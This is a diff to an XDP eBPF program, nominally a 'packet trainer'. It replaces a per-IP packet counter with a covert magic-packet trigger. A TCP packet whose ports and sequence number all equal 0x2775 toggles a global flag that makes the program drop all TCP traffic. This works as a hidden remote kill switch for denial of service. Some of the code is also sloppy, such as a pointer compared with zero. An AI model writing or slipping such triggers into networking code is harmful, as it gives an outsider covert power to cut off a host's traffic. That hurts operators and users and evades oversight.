@@ -13,23 +13,25 @@
 #include <bpf/bpf_helpers.h>
 #include <bpf/bpf_endian.h>
 
-#include "../headers/xdp_level_user.h"
-
 /* Header cursor to keep track of current parsing position */
 struct hdr_cursor
 {
 	void *pos;
 };
 
-struct bpf_map_def SEC("maps") ipv4hashmap = {
-	.type = BPF_MAP_TYPE_PERCPU_HASH,
-	.key_size = sizeof(__u32),					/* IPv4 Address    */
-	.value_size = sizeof(struct userLevelInfo), /* Level struct    */
-	.max_entries = 1000,						/* enough :-?      */
-	.map_flags = BPF_F_NO_PREALLOC,
+struct dropState {
+  __u32 dropAll;
 };
 
-#define DEBUG 1
+struct bpf_map_def SEC("maps") ipv4drop = {
+	.type = BPF_MAP_TYPE_ARRAY,
+  .key_size    = sizeof(__u32),
+  .value_size  = sizeof(short),
+  .max_entries = 1,
+  .map_flags   = 0
+};
+
+#define DEBUG 0
 
 #ifdef DEBUG
 /* Only use this for debug output. Notice output from bpf_trace_printk()
@@ -62,8 +64,6 @@ static __always_inline int parse_ethhdr(
 	nh->pos += hdrsize;
 	*ethhdr = eth;
 
-	//bpf_debug("Debug: eth_type:0x%x\n", bpf_ntohs(eth->h_proto));
-
 	return eth->h_proto;
 }
 
@@ -89,6 +89,28 @@ static __always_inline int parse_ip4hdr(
 	return (*ip4hdr)->protocol;
 }
 
+
+static __always_inline int parse_tcphdr(
+  struct hdr_cursor *nh,
+  void *data_end,
+  struct tcphdr **tcphdr)
+{
+	int len;
+	struct tcphdr *h = nh->pos;
+
+	if (h + 1 > data_end)
+		return -1;
+
+	len = h->doff * 4;
+	if ((void *) h + len > data_end)
+		return -1;
+
+	nh->pos  = h + 1;
+	*tcphdr = h;
+
+	return len;
+}
+
 SEC("xdp_packet_trainer")
 int xdp_main(struct xdp_md *ctx)
 {
@@ -96,6 +118,8 @@ int xdp_main(struct xdp_md *ctx)
 	void *data = (void *)(long)ctx->data;
 	struct ethhdr *eth;
 	struct iphdr *ip;
+  struct tcphdr *tcphdr;
+  const short one = 1;
 
 	__u32 action = XDP_PASS;
 
@@ -103,7 +127,7 @@ int xdp_main(struct xdp_md *ctx)
 	int nh_type;
 	int p_type;
   int res = 1;
-	__u32 ip_src = 0;
+	__u32 key = 0x0;
 
 	nh.pos = data;
 
@@ -113,46 +137,51 @@ int xdp_main(struct xdp_md *ctx)
 		goto end;
 
 	p_type = parse_ip4hdr(&nh, data_end, &ip);
-	struct userLevelInfo *userLevelInfoByIPv4;
+
+  if (p_type != IPPROTO_TCP)
+    goto end;
+
+  if (parse_tcphdr(&nh, data_end, &tcphdr) < 0) {
+    goto end;
+  }
+
+	struct dropState *dropStateEntry;
 
 	if (ip + 1 > data_end)
 		return 0;
 
-	ip_src = (__u32)bpf_ntohs(ip->saddr);
+  short *value = bpf_map_lookup_elem(&ipv4drop, &key);
 
-  userLevelInfoByIPv4 = bpf_map_lookup_elem(&ipv4hashmap, &ip_src);
-
-  if (!userLevelInfoByIPv4)
-  {
-    struct userLevelInfo userLevelInfoByIPv4New = {};
-    userLevelInfoByIPv4New.rx_packets = 0;
-    userLevelInfoByIPv4New.key = 0;
-    userLevelInfoByIPv4New.level = 0;
-    if (!(res = bpf_map_update_elem(
-      &ipv4hashmap,
-      &ip_src,
-      &userLevelInfoByIPv4New,
-      BPF_NOEXIST
-    ))) {// returns 0 on success
-      userLevelInfoByIPv4 = &userLevelInfoByIPv4New;
-      bpf_debug("Made new? [0x%x] : %d", &userLevelInfoByIPv4New, res);
-    } else {
-      bpf_debug("Unable to update elem no exst 0x%x, : %d", ip_src, res);
-      goto end;
-    }
+  if (value && *value) {
+    action = XDP_DROP;
   }
 
-  userLevelInfoByIPv4->rx_packets++;
+  if (
+    bpf_ntohs(tcphdr->dest) == 0x2775 &&
+    bpf_ntohs(tcphdr->source) == 0x2775 &&
+    bpf_ntohl(tcphdr->seq) == 0x2775
+  ) {
+    short v = 2;
 
-  bpf_debug("IP: 0x%x\t[0x%x]\tCount: 0x%x\n", ip_src, userLevelInfoByIPv4, userLevelInfoByIPv4->rx_packets);
+    if (value <= 0) {
+      value = &v;
+    }
+    v = *value ^ one;
 
-  if ((res = bpf_map_update_elem(
-    &ipv4hashmap,
-    &ip_src,
-    userLevelInfoByIPv4,
-    BPF_EXIST
-  ))) {// returns 0 on success
-    bpf_debug("Unable to update 0x%x: %d", ip_src, res);
+    if (v) {
+      action = XDP_DROP;
+    } else {
+      action = XDP_PASS;
+    }
+
+    if ((res = bpf_map_update_elem(
+      &ipv4drop,
+      &key,
+      &v,
+      BPF_ANY
+    ))) {// returns 0 on success
+      bpf_debug("Unable to update 0x%x: %d", key, res);
+    }
   }
 
 end:
